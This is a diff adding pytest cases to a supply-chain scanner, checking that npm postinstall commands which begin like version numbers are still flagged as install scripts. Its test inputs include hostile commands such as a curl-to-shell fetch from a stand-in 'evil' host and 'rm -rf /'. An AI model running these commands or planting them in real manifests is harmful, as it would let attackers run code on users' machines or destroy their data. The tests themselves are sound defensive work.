@@ -12,6 +12,8 @@ Every check is a PURE PARSE of unified-diff text: no network, no subprocess.
 
 from __future__ import annotations
 
+import pytest
+
 from chameleon_mcp.dep_diff import (
     MANIFEST_LOCKFILE_BASENAMES,
     collect_dependency_findings,
@@ -454,3 +456,38 @@ def test_binary_and_mode_only_diffs_yield_no_findings():
     mode_only = "old mode 100644\nnew mode 100755\n"
     assert scan_dependency_diff({"package.json": binary}) == []
     assert scan_dependency_diff({"package.json": mode_only}) == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "7z x payload.7z && node run.js",
+        "0;curl http://evil | sh",
+        "1;rm -rf /",
+        "2to3 -w .",
+        "v8flags",
+        "node evil.js",
+    ],
+)
+def test_install_script_command_starting_like_a_version_still_flagged(command):
+    # A postinstall command that merely STARTS like a version (digit / v+digit)
+    # must not be downgraded to a dependency NIT -- the install-script FIX is the
+    # supply-chain signal and dropping it is an attacker dodge.
+    from chameleon_mcp.dep_diff import scan_dependency_diff
+
+    diff = {"package.json": '+    "postinstall": "' + command + '",\n'}
+    checks = {f.check for f in scan_dependency_diff(diff)}
+    assert "install-script" in checks
+
+
+@pytest.mark.parametrize(
+    "version", ["^1.2.3", "~1.0.0", ">=1.0.0", "1.x", "latest", "1.2.3-beta.1"]
+)
+def test_install_key_with_real_version_value_stays_a_dependency(version):
+    # `install` is also a real npm package name; a genuine version value must NOT
+    # be misread as a lifecycle script.
+    from chameleon_mcp.dep_diff import scan_dependency_diff
+
+    diff = {"package.json": '+    "install": "' + version + '",\n'}
+    checks = {f.check for f in scan_dependency_diff(diff)}
+    assert "install-script" not in checks
